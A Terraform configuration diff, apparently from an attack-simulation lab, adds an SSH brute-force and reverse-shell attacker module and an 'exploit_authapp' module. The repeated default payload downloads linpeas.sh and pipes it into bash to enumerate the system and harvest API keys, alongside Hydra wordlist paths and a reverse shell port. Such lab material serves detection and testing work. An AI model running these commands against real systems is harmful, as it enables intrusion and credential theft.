@@ -112,6 +112,18 @@ variable "config" {
             })
           })
           attacker = object({
+            connect = object({
+              ssh_shell_multistage = object({
+                enabled = bool
+                user_list = string
+                password_list = string
+                attack_delay = number
+                payload = string
+                task = string
+                reverse_shell_host = string
+                reverse_shell_port = number
+              })
+            })
             listener = object({
               http = object({
                 enabled                     = bool
@@ -146,6 +158,12 @@ variable "config" {
                 target_ip                   = string
                 target_port                 = number
                 payload                     = string
+                attack_delay                = number
+              })
+              exploit_authapp = object({
+                enabled                     = bool
+                target_ip                   = string
+                target_port                 = number
                 attack_delay                = number
               })
               docker_exploit_log4j_app = object({
@@ -376,6 +394,18 @@ variable "config" {
             })
           })
           attacker = object({
+            connect = object({
+              ssh_shell_multistage = object({
+                enabled = bool
+                user_list = string
+                password_list = string
+                attack_delay = number
+                payload = string
+                task = string
+                reverse_shell_host = string
+                reverse_shell_port = number
+              })
+            })
             listener = object({
               http = object({
                 enabled                     = bool
@@ -410,6 +440,12 @@ variable "config" {
                 target_ip                   = string
                 target_port                 = number
                 payload                     = string
+                attack_delay                = number
+              })
+              exploit_authapp = object({
+                enabled                     = bool
+                target_ip                   = string
+                target_port                 = number
                 attack_delay                = number
               })
               docker_exploit_log4j_app = object({
@@ -640,6 +676,18 @@ variable "config" {
             })
           })
           attacker = object({
+            connect = object({
+              ssh_shell_multistage = object({
+                enabled = bool
+                user_list = string
+                password_list = string
+                attack_delay = number
+                payload = string
+                task = string
+                reverse_shell_host = string
+                reverse_shell_port = number
+              })
+            })
             listener = object({
               http = object({
                 enabled                     = bool
@@ -674,6 +722,12 @@ variable "config" {
                 target_ip                   = string
                 target_port                 = number
                 payload                     = string
+                attack_delay                = number
+              })
+              exploit_authapp = object({
+                enabled                     = bool
+                target_ip                   = string
+                target_port                 = number
                 attack_delay                = number
               })
               docker_exploit_log4j_app = object({
@@ -913,6 +967,18 @@ variable "config" {
             }
           }
           attacker = {
+            connect = {
+              ssh_shell_multistage = {
+                enabled = false
+                user_list = "/tmp/hydra-users.txt"
+                password_list = "/tmp/hydra-passwords.txt"
+                attack_delay = 50400
+                payload = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                task = "custom"
+                reverse_shell_host = null
+                reverse_shell_port = 4444
+              }
+            }
             listener = {
               http = {
                 enabled                     = false
@@ -947,6 +1013,12 @@ variable "config" {
                 target_ip                   = null
                 target_port                 = 8089
                 payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                attack_delay                = 50400
+              }
+              exploit_authapp = {
+                enabled                     = false
+                target_ip                   = null
+                target_port                 = 8000
                 attack_delay                = 50400
               }
               docker_exploit_log4j_app = {
@@ -1177,6 +1249,18 @@ variable "config" {
             }
           }
           attacker = {
+            connect = {
+              ssh_shell_multistage = {
+                enabled = false
+                user_list = "/tmp/hydra-users.txt"
+                password_list = "/tmp/hydra-passwords.txt"
+                attack_delay = 50400
+                payload = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                task = "custom"
+                reverse_shell_host = null
+                reverse_shell_port = 4444
+              }
+            }
             listener = {
               http = {
                 enabled                     = false
@@ -1211,6 +1295,12 @@ variable "config" {
                 target_ip                   = null
                 target_port                 = 8089
                 payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                attack_delay                = 50400
+              }
+              exploit_authapp = {
+                enabled                     = false
+                target_ip                   = null
+                target_port                 = 8000
                 attack_delay                = 50400
               }
               docker_exploit_log4j_app = {
@@ -1461,6 +1551,18 @@ variable "config" {
             }
           }
           attacker = {
+            connect = {
+              ssh_shell_multistage = {
+                enabled = false
+                user_list = "/tmp/hydra-users.txt"
+                password_list = "/tmp/hydra-passwords.txt"
+                attack_delay = 50400
+                payload = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                task = "custom"
+                reverse_shell_host = null
+                reverse_shell_port = 4444
+              }
+            }
             listener = {
               http = {
                 enabled                     = false
@@ -1495,6 +1597,12 @@ variable "config" {
                 target_ip                   = null
                 target_port                 = 8089
                 payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                attack_delay                = 50400
+              }
+              exploit_authapp = {
+                enabled                     = false
+                target_ip                   = null
+                target_port                 = 8000
                 attack_delay                = 50400
               }
               docker_exploit_log4j_app = {
